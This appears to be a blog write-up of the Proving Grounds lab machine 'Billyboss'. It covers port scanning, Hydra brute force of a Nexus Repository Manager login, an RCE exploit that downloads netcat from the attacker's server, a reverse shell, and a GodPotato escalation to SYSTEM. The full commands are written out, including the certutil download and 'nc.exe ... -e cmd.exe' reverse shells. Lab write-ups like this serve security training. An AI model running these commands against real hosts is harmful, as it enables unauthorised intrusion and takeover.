---
layout: post
title: PG | Billyboss
subtitle: Billyboss will keep your artefacts safe, secure and with a smile.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 14:26 UTC
Nmap scan report for 192.168.182.61
Host is up (0.014s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-27T14:29:25
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.53 seconds
~~~

# Service Enumeration

## FTP (TCP/21)

The FTP server does not allow anonymous connections
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ ftp anonymous@192.168.182.61 
Connected to 192.168.182.61.
220 Microsoft FTP Service
534 Policy requires SSL.
ftp: Login failed
ftp> 
ftp> 
zsh: suspended  ftp anonymous@192.168.182.61
~~~
## HTTP (TCP/80)

The web server on port 80 is hosting BaGet, after researching for exploits I could not find one for this application

![Billyboss](/assets/img/BillybossPG(1).png)

## SMB (TCP/139, 445)

The SMB server does not allow NULL connections
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ smbclient -N -L //192.168.182.61                     
session setup failed: NT_STATUS_ACCESS_DENIED
~~~
## HTTP (TCP/8081)

The web server on port 8081 is running 'Sonatype Nexus Repository Manager'

![Billyboss](/assets/img/BillybossPG(2).png)

I found [this](https://www.exploit-db.com/exploits/49385) Remote Code Execution (RCE) exploit but it requires valid credentials to work

I searched for default login credentials and found admin:admina, but they did not work

![Billyboss](/assets/img/BillybossPG(3).png)

I then attempted to brute force the admin account with a password list using Hydra

I intercepted the login request using BurpSuite to find the HTTP Auth parameters for the brute force attempt

![Billyboss](/assets/img/BillybossPG(4).png)

The parameters I found were username= and password= and they were both base64 encoded, I also set the failed attempt parameter to the HTTP 403
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ hydra -I -f -l admin -P xato-net-10-million-passwords-10000.txt 'http-post-form://192.168.182.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 14:51:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.182.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403
[STATUS] 2845.00 tries/min, 2845 tries in 00:01h, 7155 to do in 00:03h, 16 active
[STATUS] 2971.00 tries/min, 8913 tries in 00:03h, 1087 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 14:54:44
~~~
The brute force on the admin account was unsuccessful, so I created a custom username/password list by pulling keywords from the website using the CeWL tool
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ cewl --lowercase http://192.168.182.61:8081/ | grep -v CeWL > custom-wordlist.txt
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ cat custom-wordlist.txt                                                          
nexus
repository
manager
loading
new
image
src
http
static
rapture
resources
favicon
ico
oss
product
logo
spinner
browse
history
form
~~~

~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.182.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403' 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 15:02:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:20/p:20), ~25 tries per task
[DATA] attacking http-post-form://192.168.182.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403
[8081][http-post-form] host: 192.168.182.61   login: nexus   password: nexus
[STATUS] attack finished for 192.168.182.61 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 15:02:01
~~~

It found successful credentials! nexus:nexus

# Exploit

I downloaded the exploit to my current directory and changed the target URL, username and password parameters to match the target machine, to get my shell I used nc.exe (netcat) which I first had to use the RCE to download nc.exe to the target.
~~~shell
Saving exploit locally
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ cp /usr/share/exploitdb/exploits/java/webapps/49385.py . 
~~~
Starting HTTP server to host nc.exe
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ python -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
Editing exploits parameters to download nc.exe on target via RCE

![Billyboss](/assets/img/BillybossPG(5).png)

Run the exploit
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ python3 49385.py
Logging in
Logged in successfully
Command executed
~~~
As shown below the file was successfully downloaded by the target

![Billyboss](/assets/img/BillybossPG(6).png)

I then started a netcat listener on my attack host on port 445
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ nc -nvlp 445 
listening on [any] 445 ..
~~~
I changed the RCE to now execute nc.exe and connect to my listener on port 445

![Billyboss](/assets/img/BillybossPG(7).png)

Run the exploit again
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ python3 49385.py
Logging in
Logged in successfully
Command executed
~~~
And we recieve our initial foothold!
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ nc -nvlp 445
listening on [any] 445 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.182.61] 49767
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>
~~~

# Privilege Escalation

I begun the privilege escalation enumeration by running winpeas and found our user has SeImpersonatePrivileges

![Billyboss](/assets/img/BillybossPG(8).png)

During the enumeration I also identified the target machine is running Windows 10 Build 18362

![Billyboss](/assets/img/BillybossPG(9).png)

As discussed on [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato) JuicyPotato the commonly used Windows PrivEsc tool that abuses SeImpersonatePrivileges doesn't work on builds >1809, so I instead used [GodPotato](https://github.com/BeichenDream/GodPotato)

I downloaded the exploit
~~~shell
┌──(kali㉿kali)-[~/Desktop/Billyboss]
└─$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
~~~
Transferred the exploit to the target
~~~shell
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil.exe -urlcache -split -f "http://192.168.45.167/GodPotato-NET4.exe"
certutil.exe -urlcache -split -f "http://192.168.45.167/GodPotato-NET4.exe"
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
~~~
Started a netcat listener on port 139 to catch the root (system) shell
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 139 
listening on [any] 139 ...
~~~
Then ran the exploit on the target host
~~~shell
C:\Users\nathan\Nexus\nexus-3.21.0-05>.\GodPotato-NET4.exe -cmd "c:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe 192.168.45.167 139 -e cmd.exe"
.\GodPotato-NET4.exe -cmd "c:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe 192.168.45.167 139 -e cmd.exe"
[*] CombaseModule: 0x140722501320704
[*] DispatchTable: 0x140722503663200
[*] UseProtseqFunction: 0x140722503031232
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\a17a64b5-1d2e-4544-8be2-f74bdf1f676e\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000d002-0d4c-ffff-fe3b-ccec06251479
[*] DCOM obj OXID: 0xeb6772a8e970558c
[*] DCOM obj OID: 0x4bbe2da56bcc4d72
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 832 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1900
~~~
And I got a root (system) shell on my listener!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 139 
listening on [any] 139 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.182.61] 49797
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
~~~